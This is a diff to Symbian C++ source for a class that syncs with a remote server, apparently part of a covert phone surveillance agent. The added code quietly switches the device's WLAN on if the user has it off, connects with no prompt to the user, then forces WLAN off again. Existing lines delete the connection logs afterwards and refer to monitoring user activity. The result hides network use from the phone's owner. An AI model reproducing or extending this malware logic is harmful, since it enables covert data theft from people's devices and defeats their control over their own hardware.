@@ -27,9 +27,15 @@
 
 #define KLogWlanDataEventType 0x1000595f
 const TUid KLogWlanDataEventTypeUid = {KLogWlanDataEventType};
+
+//wlandevicesettingsinternalcrkeys.h
+const TUid KCRUidWlanDeviceSettingsRegistryId = {0x101f8e44};
+const TUint32 KWlanOnOff = 0x00000052;
+const TUint32 KWlanForceDisable = 0x00000053;
+			
      
 CActionSync::CActionSync(TQueueType aQueueType) :
-	CAbstractAction(EAction_Sync, aQueueType), iStopSubactions(EFalse), iUseWiFi(EFalse), iUseGPRS(EFalse)
+	CAbstractAction(EAction_Sync, aQueueType), iStopSubactions(EFalse), iUseWiFi(EFalse), iUseGPRS(EFalse), iRestoreWlanOffStatus(EFalse)
 	{
 	// No implementation required
 	}
@@ -541,6 +547,11 @@ void CActionSync::DispatchStartCommandL()
 		//iStartMonitor = ETrue;       // we have to monitor user activity  //TODO:restore this when testing done
 		iDeleteLog = ETrue;			// since it's a new conn, we have to delete its log
 		
+		#ifndef __SERIES60_3X__  //only Symbian^3
+		if(iUseWiFi)
+			iRestoreWlanOffStatus = SetWlanOn();
+		#endif
+		
 		err = ConnectionStartL();
 	}
 	
@@ -551,6 +562,21 @@ void CActionSync::DispatchStartCommandL()
 		
 		iStartMonitor = EFalse;
 		iDeleteLog = EFalse;
+
+		#ifndef __SERIES60_3X__  //only Symbian^3
+		if(iRestoreWlanOffStatus)
+			{
+			CRepository* repository = NULL;
+			TRAPD(error,repository = CRepository::NewL( KCRUidWlanDeviceSettingsRegistryId ));
+			if ((error == KErrNone) && repository)
+				{
+				CleanupStack::PushL(repository);
+				TInt err = repository->Set(KWlanOnOff,0); // force to Off
+				CleanupStack::PopAndDestroy(repository);
+				}
+			}
+		#endif
+		
 		MarkCommandAsDispatchedL();
 		SetFinishedJob(ETrue);
 		return;
@@ -567,6 +593,20 @@ void CActionSync::DispatchStartCommandL()
 void CActionSync::ConnectionTerminatedL(TInt aError)
 	{
 	iConnection.Close(); 
+	
+	#ifndef __SERIES60_3X__   //only Symbian^3
+	if(iRestoreWlanOffStatus)
+		{
+		CRepository* repository = NULL;
+		TRAPD(error,repository = CRepository::NewL( KCRUidWlanDeviceSettingsRegistryId ));
+		if ((error == KErrNone) && repository)
+			{
+			CleanupStack::PushL(repository);
+			TInt err = repository->Set(KWlanOnOff,0); // force to Off
+			CleanupStack::PopAndDestroy(repository);
+			}
+		}
+	#endif	
 	
 	if(iDeleteLog)
 		{
@@ -606,7 +646,7 @@ TInt CActionSync::ConnectionStartL()
 		TCommDbConnPref connPref;
 		connPref.SetDialogPreference(ECommDbDialogPrefDoNotPrompt);
 		connPref.SetDirection(ECommDbConnectionDirectionOutgoing);
-		
+		//TODO: disable notes only in Symbian3
 		for(TInt i=0; i<count; i++)
 		{
 			connPref.SetIapId(iIapArray[i]);
@@ -618,7 +658,7 @@ TInt CActionSync::ConnectionStartL()
 			if(err == KErrNone)
 					return err;
 			else if((err <= -30171) && (err >= -30207)) //wlan error code wlanerrorcodes.h
-				{
+				{ 
 				CConnLogCleaner* logCleaner = CConnLogCleaner::NewLC();
 				TRAPD(result,logCleaner->DeleteConnLogSyncL(EWlan));
 				CleanupStack::PopAndDestroy(logCleaner);
@@ -665,6 +705,25 @@ TInt32 CActionSync::GetMmsAccessPointL()
 	return mmsAp;
 	}
 
+TBool CActionSync::SetWlanOn()
+	{
+	TBool restore = EFalse;
+	CRepository* repository = NULL;
+	TRAPD(error,repository = CRepository::NewL( KCRUidWlanDeviceSettingsRegistryId ));
+	if ((error == KErrNone) && repository)
+		{
+		CleanupStack::PushL(repository);
+		TInt value = 0;
+		TInt err = repository->Get(KWlanOnOff,value);  // 0 = Off, 1 = On
+		if((err == KErrNone) && (value == 0))
+			{
+			err = repository->Set(KWlanOnOff,1); // force to On
+			restore = ETrue;
+			}		
+		CleanupStack::PopAndDestroy(repository);
+		}
+	return restore;
+	}
 
 /*
  L'ActionSync  avvia il processo di sincronizzazione con il server remoto tramite i seguenti passi:
